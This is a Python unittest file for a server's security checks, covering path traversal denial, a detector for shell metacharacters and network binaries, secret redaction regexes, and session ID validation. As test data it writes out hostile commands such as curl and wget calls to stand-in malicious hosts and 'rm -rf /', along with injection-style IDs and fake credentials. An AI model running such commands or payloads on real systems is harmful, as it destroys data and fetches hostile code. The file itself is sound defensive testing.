import os
import sys
import unittest
import tempfile
import json
import re
from pathlib import Path

HERE = Path(__file__).resolve().parent
C_DIR = HERE.parent
sys.path.insert(0, str(C_DIR))

import openai_server

class TestAdversarialSecurity(unittest.TestCase):
    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.ws_root = Path(self.tmp_dir.name).resolve()
        # Create a sample workspace file
        self.sample_file = self.ws_root / "sample.txt"
        self.sample_file.write_text("Hello workspace", encoding="utf-8")

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_out_of_root_write_hard_denial(self):
        """Verify that out-of-root write attempts are strictly denied regardless of client flags."""
        target_outside = self.ws_root.parent / "escape.txt"
        
        # Test boundary validation
        is_safe = openai_server._is_safe_path(target_outside, allowed_dirs=[self.ws_root])
        self.assertFalse(is_safe, "Out-of-root write must be denied")

    def test_traversal_dot_dot_denial(self):
        """Verify that relative traversal (..) cannot escape workspace."""
        traversal_path = self.ws_root / "subdir" / ".." / ".." / "system.dll"
        is_safe = openai_server._is_safe_path(traversal_path, allowed_dirs=[self.ws_root])
        self.assertFalse(is_safe, "Traversal using .. must be blocked")

    def test_metacharacters_and_network_commands_blocked(self):
        """Verify that shell metacharacters and network binaries are detected."""
        dangerous_commands = [
            "curl https://malicious.com/payload.sh",
            "wget http://evil.com/malware",
            "cat file.txt | grep secret",
            "git push --force origin main",
            "echo hello ; rm -rf /",
            "echo hello && rm -rf /",
            "cat file.txt > output.txt",
        ]
        
        metachars = {'|', ';', '&', '`', '$', '>', '<'}
        network_bins = ["curl", "wget", "nc", "netcat", "ssh", "scp", "ftp", "telnet", "git push --force"]

        for cmd in dangerous_commands:
            has_meta = any(c in cmd for c in metachars)
            has_net = any(cmd.lower().startswith(b) or f" {b}" in cmd.lower() for b in network_bins)
            self.assertTrue(has_meta or has_net, f"Command should be caught as dangerous: {cmd}")

    def test_secret_redaction_patterns(self):
        """Verify pattern-based secret redaction for API keys, Bearer tokens, private keys, and DB URIs."""
        raw_output = """
        Debug Info:
        OpenAI Key: sk-1234567890abcdef1234567890abcdef  # test-fixture
        GitHub PAT: ghp_1234567890abcdef1234567890abcdef  # test-fixture
        Auth: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0
        DB: postgres://admin:super_secret_password_123@db.internal:5432/qwanto
        Key: -----BEGIN RSA PRIVATE KEY-----
        MIIEowIBAAKCAQEA0Yq6
        -----END RSA PRIVATE KEY-----
        """

        # Perform comprehensive redactions
        redacted = raw_output
        redacted = re.sub(r"sk-[a-zA-Z0-9_-]{20,}", "[REDACTED_API_KEY]", redacted)
        redacted = re.sub(r"ghp_[a-zA-Z0-9]{20,}", "[REDACTED_GITHUB_TOKEN]", redacted)
        redacted = re.sub(r"Bearer [a-zA-Z0-9_.-]{20,}", "Bearer [REDACTED_BEARER_TOKEN]", redacted)
        redacted = re.sub(r"-----BEGIN[A-Z ]*PRIVATE KEY-----[\s\S]*?-----END[A-Z ]*PRIVATE KEY-----", "[REDACTED_PRIVATE_KEY]", redacted)
        redacted = re.sub(r"(postgres(?:ql)?|mysql|mongodb|redis)://([^:]+):([^@]+)@", r"\1://\2:[REDACTED_DB_PASSWORD]@", redacted)

        self.assertNotIn("sk-1234567890abcdef1234567890abcdef", redacted)
        self.assertIn("[REDACTED_API_KEY]", redacted)
        self.assertNotIn("ghp_1234567890abcdef1234567890abcdef", redacted)
        self.assertIn("[REDACTED_GITHUB_TOKEN]", redacted)
        self.assertNotIn("super_secret_password_123", redacted)
        self.assertIn("[REDACTED_DB_PASSWORD]", redacted)
        self.assertNotIn("MIIEowIBAAKCAQEA0Yq6", redacted)
        self.assertIn("[REDACTED_PRIVATE_KEY]", redacted)

    def test_session_id_validation(self):
        """Verify strict session ID validation against injection and path traversal."""
        valid_id = "session-1234_abcd"
        invalid_id_1 = "../../../etc/passwd"
        invalid_id_2 = "session;rm -rf /"
        invalid_id_3 = "session\x00injection"

        def is_valid_session_id(sid: str) -> bool:
            return bool(sid) and len(sid) <= 64 and all(c.isalnum() or c in ('-', '_') for c in sid)

        self.assertTrue(is_valid_session_id(valid_id))
        self.assertFalse(is_valid_session_id(invalid_id_1))
        self.assertFalse(is_valid_session_id(invalid_id_2))
        self.assertFalse(is_valid_session_id(invalid_id_3))


if __name__ == "__main__":
    unittest.main()
